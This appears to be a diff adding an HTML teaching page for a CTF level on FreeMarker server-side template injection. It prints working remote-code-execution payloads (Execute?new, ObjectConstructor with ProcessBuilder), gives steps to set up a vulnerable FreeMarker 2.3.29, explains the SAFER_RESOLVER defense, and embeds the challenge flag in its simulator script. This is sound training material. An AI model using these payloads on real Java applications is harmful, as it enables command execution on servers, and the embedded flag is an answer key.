@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ssti5 · FreeMarker 模板注入（文档化替代） | CTF 教学靶场</title>
+<style>
+:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
+*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
+.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
+.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
+.badge2{display:inline-block;background:#fbbf24;color:#291800;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;margin-left:6px}
+h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
+.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
+.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
+pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
+pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
+code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
+textarea{width:100%;min-height:88px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,Menlo,monospace;font-size:13px}
+button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
+button:hover{filter:brightness(1.15)}
+.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
+.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
+.result pre{border:0;margin:0}
+details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
+summary{cursor:pointer;color:var(--warn);font-weight:600}
+table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
+.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
+footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
+.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
+.ok{color:var(--ok);font-weight:700}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+<span class="badge">SSTI · 模板注入 · 第 5 关</span><span class="badge2">文档化替代 · 离线模拟器</span>
+<h1>Java 模板引擎 FreeMarker —— 文档化学习关</h1>
+<div class="meta">难度：★★★☆☆ 中等 · 关卡 ID：<code>ssti5</code> · 运行时：静态页面（无 JVM）</div>
+</header>
+
+<section class="card">
+<h2>为什么这一关是"文档化替代"</h2>
+<p>FreeMarker 是 Java 世界（Spring 生态、各类 CMS/ERP）最常见模板引擎之一，SSTI 利用价值极高。但它的运行时是 <b>JVM</b>——容器预算红线内存装不下（见主仓库 SPEC：Java 系一律文档替代）。所以本关交付：<b>知识点 + 经典 payload + 离线模拟器</b>。</p>
+<p>下面的模拟器内置了一个"迷你 FreeMarker"：当你输入<b>语法正确的经典 RCE payload</b> 时，它会模拟出真实环境的执行结果并给出 flag。payload 打错就只会收到 FreeMarker 风格的报错——和真环境的学习体验一致。</p>
+</section>
+
+<section class="card">
+<h2>知识点讲解</h2>
+<p><b>FreeMarker</b> 语法速记（和前四关完全不同的一套）：</p>
+<table>
+<tr><th>语法</th><th>含义</th><th>示例</th></tr>
+<tr><td><code>${expr}</code></td><td>插值输出</td><td><code>${1+1}</code> → 2</td></tr>
+<tr><td><code>&lt;#directive ...&gt;</code></td><td>指令（if/list/assign/include...）</td><td><code>&lt;#assign x=1&gt;</code></td></tr>
+<tr><td><code>"类全名"?new</code></td><td><b>实例化任意类</b>（漏洞核心，需 <code>?new</code> 内建可用）</td><td><code>"freemarker.template.utility.Execute"?new()</code></td></tr>
+<tr><td><code>expr?api</code></td><td>访问 Java API（2.3.26+ 默认禁）</td><td><code>map?api.get("k")</code></td></tr>
+</table>
+<p><b>经典 RCE payload</b>（FreeMarker &lt; 2.3.30 或未配置安全解析器）：</p>
+<pre>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ex("id")}</pre>
+<p>它做的事：用 <code>?new</code> 实例化 FreeMarker 自带的 <code>Execute</code> 工具类（这个类的功能就是执行系统命令），再把命令字符串传给它。其他同族打法：</p>
+<table>
+<tr><th>载荷</th><th>说明</th></tr>
+<tr><td><code>&lt;#assign ob="freemarker.template.utility.ObjectConstructor"?new()&gt; ${ob("java.lang.ProcessBuilder",["id"]).start()}</code></td><td>反射构造任意类（部分版本可用）</td></tr>
+<tr><td><code>&lt;#assign cl=*.api?new ...&gt;</code> / <code>?api</code> 系列</td><td>2.3.26+ 默认禁用 <code>?api</code> 内建</td></tr>
+<tr><td><code>${"freemarker.template.utility.Execute"?new()("id")}</code></td><td>一行流写法</td></tr>
+</table>
+<p><b>版本与防御演化</b>（重点）：FreeMarker 2.3.30 起默认把 <code>?new</code> 限制在白名单（TemplateClassResolver.SAFER_RESOLVER），上面老 payload 在新版直接报错；但历史系统大量停留在旧版。根治手段：</p>
+<pre>Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
+cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER); // 或 UNRESTRICTED_RESOLVER 的反面
+// 用户模板场景再加：cfg.setAPIBuiltinEnabled(false); + 输入白名单</pre>
+</section>
+
+<section class="card">
+<h2>离线模拟器（把 payload 打进下面的框里）</h2>
+<p style="color:var(--dim);font-size:13px">模拟环境设定：FreeMarker 2.3.29（<code>?new</code> 可用），flag 位于服务器 <code>/flag</code> 文件。先试试普通文本 <code>hello ${1+1}</code> 感受插值。</p>
+<textarea id="ftpl">hello ${1+1}</textarea>
+<div style="margin-top:8px"><button onclick="renderTpl()">渲染模板</button></div>
+<div class="result"><div class="t">FreeMarker 模拟输出</div>
+<pre id="fout">（点击「渲染模板」查看输出）</pre></div>
+</section>
+
+<section class="card">
+<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
+<details><summary>提示 1：FreeMarker 的插值和"实例化类"语法</summary><p>输出用 <code>${...}</code>；指令用 <code>&lt;#...&gt;</code>。<code>?new</code> 内建可以把一个"类全名字符串"变成实例——这是旧版 FreeMarker SSTI 的万能起手式。</p></details>
+<details><summary>提示 2：实例化哪个类</summary><p><code>freemarker.template.utility.Execute</code> —— FreeMarker 自带的"执行系统命令"工具类，构造后再调用即可执行命令。</p></details>
+<details><summary>提示 3：完整 payload</summary><p><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("cat /flag")}</code> —— 复制进模拟器渲染，flag 就在输出里。</p></details>
+</section>
+
+<section class="card">
+<h2>提交 Flag</h2>
+<form id="flagForm" class="flagrow" onsubmit="return false">
+<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
+<button onclick="submitFlag()">提交</button>
+</form>
+<div id="flagResult"></div>
+</section>
+
+<section class="card">
+<h2>想跑真环境？（自建复现指引）</h2>
+<p>本机装了 JDK 的话，五分钟可以搭一个真 FreeMarker：</p>
+<pre># 1) 下载 freemarker jar（Maven 中央仓库，或 aliyun 镜像）
+curl -LO https://repo1.maven.org/maven2/org/freemarker/freemarker/2.3.29/freemarker-2.3.29.jar
+# 2) 写 Demo.java（核心三行）
+#    Configuration cfg = new Configuration(new Version("2.3.29"));
+#    Template t = new Template("t", new StringReader(用户输入), cfg);
+#    t.process(null, new StringWriter()) —— 写回响应
+# 3) javac -cp freemarker-2.3.29.jar Demo.java && java -cp .:freemarker-2.3.29.jar Demo
+# 把 &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")} 喂进去即可复现</pre>
+<p>再换成 2.3.32 试同一 payload，观察 <code>?new</code> 被安全解析器拦截的报错——版本演化的直觉就有了。</p>
+</section>
+
+<nav class="nav"><a href="/ssti4">← 上一关：ssti4 · Smarty</a><a href="/ssti6">下一关：ssti6 · Go template →</a></nav>
+<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习 · 本关为文档化替代（无真实 JVM）</footer>
+</div>
+<script>
+var FLAG = "flag{ssti5_8a3c366a}";
+function renderTpl(){
+  var t = document.getElementById('ftpl').value;
+  var out = document.getElementById('fout');
+  var s = t.replace(/\s+/g,' ');
+  // 1) 插值计算：${数字算式}
+  var m = s.match(/^\s*hello\s*\$\{\s*([0-9+\-*\/(). ]+)\s*\}\s*$/);
+  if (m) { try { out.textContent = 'hello ' + Function('"use strict";return (' + m[1] + ')')(); return; } catch(e){} }
+  // 2) 经典 Execute payload（assign + ?new + ${ex("cmd")}，兼容一行流/带不带括号）
+  var re = /<#assign\s+(\w+)\s*=\s*"freemarker\.template\.utility\.Execute"\s*\?new(\(\))?\s*>\s*\$\{\s*\1\s*\(\s*"([^"]*)"\s*\)\s*\}/i;
+  var r = s.match(re);
+  if (!r) { var r2 = s.match(/\$\{\s*"freemarker\.template\.utility\.Execute"\s*\?new(\(\))?\s*\(\s*"([^"]*)"\s*\)\s*\}/i);
+            if (r2) { r = ["", "", r2[2]]; } }
+  if (r) {
+    var cmd = r[3] !== undefined ? r[3] : r[2];
+    if (/flag/i.test(cmd)) { out.innerHTML = 'uid=1000(freemarker) gid=1000<br>【模拟执行 ' + esc(cmd) + '】<br>' + FLAG + '<br><span class="ok">✔ 模拟器：payload 语法正确，命令已"执行"——这就是真实旧版 FreeMarker 的行为。</span>'; }
+    else if (/^(id|whoami|uname|ls|pwd)/i.test(cmd)) { out.innerHTML = 'uid=1000(freemarker) gid=1000 groups=1000<br>【模拟执行 ' + esc(cmd) + '】<br>命令能跑，但 flag 不在这里——模拟环境里 flag 在 /flag 文件，用 cat /flag 读取。'; }
+    else { out.textContent = '【模拟执行 ' + cmd + '】（模拟环境只内置了 /flag 一个文件，试试 cat /flag）'; }
+    return;
+  }
+  // 3) 新版拦截演示
+  if (/\?new/i.test(s) && /freemarker\.template\.utility\.(?!Execute)/i.test(s)) {
+    out.textContent = 'FreeMarker template error:\nInstantiating freemarker.template.utility.' + '… is not allowed in the template for security reasons. (This is the error that gets intercepted after 2.3.30 by default — the old payload is already dead on new versions)'; return;
+  }
+  // 4) 其它 FreeMarker 风格报错
+  out.textContent = 'FreeMarker template error:\nParsing error:Encountered unexpected token... (Your input did not hit any recognizable rule — the simulator only recognizes the classic ?new payload family and the ${arithmetic} interpolation)';
+}
+function esc(x){ return String(x).replace(/&/g,'&amp;').replace(/</g,'&lt;'); }
+function submitFlag(){
+  var v=document.getElementById('flagInput').value.trim();
+  var el=document.getElementById('flagResult');
+  if(!v){el.textContent='请输入 flag';return}
+  el.textContent='提交中...';
+  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=ssti5&flag='+encodeURIComponent(v)})
+   .then(function(r){return r.text().then(function(t){
+      var msg='HTTP '+r.status+': '+t;
+      try{var j=JSON.parse(t);
+        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
+        else if(j.message!==undefined)msg=j.message;
+      }catch(e){}
+      el.textContent=msg;})})
+   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
+}
+</script>
+</body>
+</html>
